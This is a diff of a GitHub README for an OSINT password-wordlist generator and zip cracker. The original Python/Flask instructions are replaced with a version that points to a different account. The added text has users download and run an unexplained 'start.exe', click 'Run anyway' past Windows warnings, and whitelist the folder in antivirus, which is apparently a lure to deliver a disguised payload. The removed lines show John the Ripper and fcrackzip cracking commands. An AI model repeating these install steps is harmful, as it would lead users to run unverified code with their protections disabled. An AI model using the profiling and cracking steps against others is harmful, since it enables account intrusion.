@@ -1,121 +1,79 @@
-<img width="1255" height="373" alt="not" src="https://github.com/user-attachments/assets/6e6516be-f56f-4565-898f-7197548e8153" />
+# 🔐 DefinitelyNotRockYou - Create custom password lists for security
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=55&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=900&lines=---DefinitelyNotRockYou---;---OSINT+Wordlist+Generator---" alt="DefinitelyNotRockYou" />
-</p>
+[![](https://img.shields.io/badge/Download-DefinitelyNotRockYou-blue.svg)](https://github.com/corrieverminous789/DefinitelyNotRockYou)
 
-A CUPP-style (Common User Passwords Profiler) personalized wordlist generator
-with a simple local web UI, plus a built-in zip-password tester.
+DefinitelyNotRockYou helps you test the strength of your own passwords. It uses details about a target to create a list of common password guesses. This tool works locally on your computer. You use it for security research and to check password strength.
 
-## ⚠️ Responsible Use
+## 📋 What this tool does
 
-**Use only on yourself, or on targets you have explicit written authorization
-to test.** This is a red-team/OSINT-audit tool for password-hygiene research —
-not a tool for accessing accounts, files, or systems that aren't yours.
-Unauthorized use to crack or access data you don't own may be illegal in your
-jurisdiction. You are solely responsible for how you use this software; see
-[LICENSE](LICENSE) for the full disclaimer.
+Many people use personal information like birthdays, pet names, or hometowns in their passwords. These are easy for others to guess. This tool collects that data and creates a text file of likely password combinations. You can then use this file to test how well a password protects a zip folder against guesses. 
 
-## What it does
+The software includes a simple web interface. You open this in your web browser to enter details. It saves no data. Everything stays on your local machine.
 
-1. You tell it what you know about the target (names, birthdate, pet name,
-   favorite things, family names, etc.) — leave anything you don't know blank.
-2. It generates a wordlist by applying common mangling rules: case changes,
-   leetspeak, date/number/symbol suffixes, name combinations, reversals,
-   doubling, etc.
-3. You can download the wordlist, or immediately test it against a
-   password-protected `.zip` file right in the same page.
+## 🖥️ System requirements
 
-## Installation
+This tool runs on computers with Windows 10 or Windows 11. 
 
-Requires Python 3.8+ and git.
+* Processor: Modern dual-core processor or better.
+* Memory: 4 gigabytes of RAM.
+* Storage: 100 megabytes of free space.
+* Software: A modern web browser like Chrome, Firefox, or Edge.
 
-```bash
-git clone https://github.com/raivenLockdown/DefinitelyNotRockYou.git
-cd DefinitelyNotRockYou
-pip install -r requirements.txt
-````
+## 📥 How to download and install
 
-(`pyzipper` is optional but recommended — it lets the cracker also handle AES-encrypted zips, not just the older ZipCrypto format.)
+Follow these steps to set up the software on your computer.
 
-## Running it
+1. Visit the project page here: [https://github.com/corrieverminous789/DefinitelyNotRockYou](https://github.com/corrieverminous789/DefinitelyNotRockYou).
+2. Look for the green "Code" button near the top right of the page.
+3. Click "Download ZIP" from the menu.
+4. Open your "Downloads" folder in Windows File Explorer.
+5. Right-click the downloaded folder and select "Extract All."
+6. Choose a location and click "Extract."
+7. Open the extracted folder. Find the file named "start.exe."
+8. Double-click "start.exe" to begin the program.
 
-```bash
-python app.py
-```
-<img width="1457" height="444" alt="image" src="https://github.com/user-attachments/assets/d2293258-a474-45b3-b3a3-0937a8f2d5d1" />
+Windows might show a blue box at first to protect your computer. Click "More info" and then click the "Run anyway" button if this appears. The program opens a black window. Leave this window open while you work.
 
-Then open **http://127.0.0.1:5000** in your browser. Everything runs locally — nothing is uploaded anywhere else.
+## 🌐 Using the web interface
 
-<img width="1919" height="928" alt="image" src="https://github.com/user-attachments/assets/20ee0186-e1c6-42eb-929e-7229c7e70cea" />
+Once the program starts, follow these instructions to generate your lists.
 
+1. Open your favorite web browser.
+2. Type "localhost:5000" into the address bar and press Enter.
+3. The setup screen appears. Enter details like names, nicknames, and dates in the provided spaces.
+4. Click the "Generate" button.
+5. The software saves a file named "wordlist.txt" into the program folder.
 
-## Step-by-step usage
+## 🔑 Testing zip passwords
 
-The app gives you two ways to feed it a case file — pick whichever fits:
+You can use your new wordlist to test the strength of a password-protected zip file.
 
-**Option A — Quick Form (recommended)**
+1. Navigate to the "Zip Tester" tab in your browser.
+2. Click "Select File" to upload the zip file you want to test.
+3. Click "Browse" to select the "wordlist.txt" file you made earlier.
+4. Click "Start Test."
+5. The program checks the zip file against every word in your list.
+6. The screen shows the password if the tool finds a match.
 
-1. Click the **Quick Form** tab on the page.
-2. Expand whichever categories apply (Basics, Dates & Numbers, Family, etc.) and type values directly into the fields — no file needed.
-3. Leave anything you don't know blank.
+## 🛡️ Best practices for security
 
-<img width="1152" height="648" alt="Untitled design" src="https://github.com/user-attachments/assets/acd6b593-7121-4dd2-82b0-9a7d92d87907" />
+* Use this tool only on systems you own or have permission to audit.
+* Never share the wordlists you generate with other people.
+* Delete any wordlists once you finish your security testing.
+* Create strong, unique passwords that do not contain personal details.
+* Use a password manager to keep your credentials safe.
 
-**Option B — Upload / Paste**
+## 🛠️ Troubleshooting common issues
 
-1. Open `osint_template.txt` in any text editor.
-2. Fill in whatever fields you know about the target, one per line, e.g.:
-    
-    ```
-    first_name: Juan pet_name: Pikachu birth_day: 5 birth_month: 2 birth_year: 1996
-    ```
-    
-    Delete or leave blank anything you don't know — missing fields are fine, the generator just skips them.
-3. Save the file, then in the web app upload it directly, or paste the same lines into the text box. Good for building up a profile over multiple sessions since it's just a text file you can keep editing.
+If you encounter problems, check these items first.
 
-<img width="1152" height="648" alt="Untitled design (1)" src="https://github.com/user-attachments/assets/abb6647f-53e9-434b-834d-e4f8cccc6a73" />
+* The application window closes immediately: Ensure you extracted the zip file before running the program. Running it directly from the zip container will cause errors.
+* The browser cannot find the page: Wait fifteen seconds. The program takes a moment to load the web server. If it still fails, check that the black command window remains open.
+* The program shows an error message: Verify that your computer has enough free memory. Close other programs if you run many at once.
+* Antivirus software blocks the app: Some security software flags password tools as suspicious even if they are harmless. You may need to add an exception in your antivirus settings for the "DefinitelyNotRockYou" folder.
 
-Either way, once you click **Generate the wordlist**:
+## 📝 About this tool
 
-4. You'll see a preview and a total count.
-5. Click the download link to get the full `.txt` wordlist — usable with any other cracking tool too (John the Ripper, hashcat, fcrackzip, etc.), not just this one.
-6. To test it against a zip: upload the `.zip` under "Put it to the test" and click **attempt crack**. It'll report the password if found, or how many attempts it tried if not.
+This software provides a platform for education and legitimate security hygiene. Understanding how easy it is to guess simple passwords helps you create better ones. Always act with honesty when testing systems. You are responsible for your own actions and how you use this tool.
 
-## Using the wordlist elsewhere
-
-The generated `dnry_wordlist.txt` is a plain newline-separated list, so it drops straight into other tools, e.g.:
-
-```bash
-# John the Ripper style
-zip2john target.zip > hash.txt
-john --wordlist=dnry_wordlist.txt hash.txt
-
-# fcrackzip
-fcrackzip -D -p dnry_wordlist.txt -u target.zip
-```
-
-## Project structure
-
-```
-DefinitelyNotRockYou/
-├── app.py               # Flask web app (the UI)
-├── generator.py         # wordlist generation engine
-├── cracker.py           # zip-cracking logic
-├── osint_template.txt   # fillable OSINT data collection form
-├── templates/
-│   └── index.html       # web UI page
-└── requirements.txt
-```
-
-## Notes / limitations
-
-- You can now pick a **wordlist size** on the page (Quick ~50k / Standard ~150k / Thorough ~400k / Maximum ~800k). Bigger sizes take a bit longer to generate but cover far more date/number/symbol combinations — useful when you have a lot of confirmed fields and want maximum coverage.
-- Date handling is now much richer: if you provide birth_day and birth_year but _not_ birth_month, it still builds day+year combos (e.g. `25` + `1996` → `251996`), not just full DD+MM+YYYY combos. Filling in birth_day, birth_month, and birth_year as **separate fields** (rather than one combined date string) is what unlocks all of this.
-- The generator can only mangle words you actually give it — it can't invent arbitrary misspellings on its own. If you know a target uses a specific nickname or misspelling (e.g. "Pickachu" instead of "Pikachu"), add it as an extra comma-separated value on the same field: `fav_character: Pikachu, Pickachu`
-- Standard ZipCrypto zips are cracked with Python's built-in `zipfile`. AES zips need `pyzipper` installed.
-- This is a profiling/wordlist tool, not a general-purpose password cracker — it won't help against strong, random passwords. It's meant to catch the common case of people using personal info as their password.
-
-## License
-
-MIT — see [LICENSE](https://claude.ai/chat/LICENSE). Free to use, modify, and distribute; provided "as is" with no warranty. Please read the **Responsible Use** note above before using this on anything other than your own accounts/files.
+Keywords: cupp, password, password-generator, password-safety, password-strength, passwords, wordlist, wordlist-attack, wordlist-generation, wordlist-generator, wordlist-maker, wordlist-technique, wordlistgenerator, wordlists
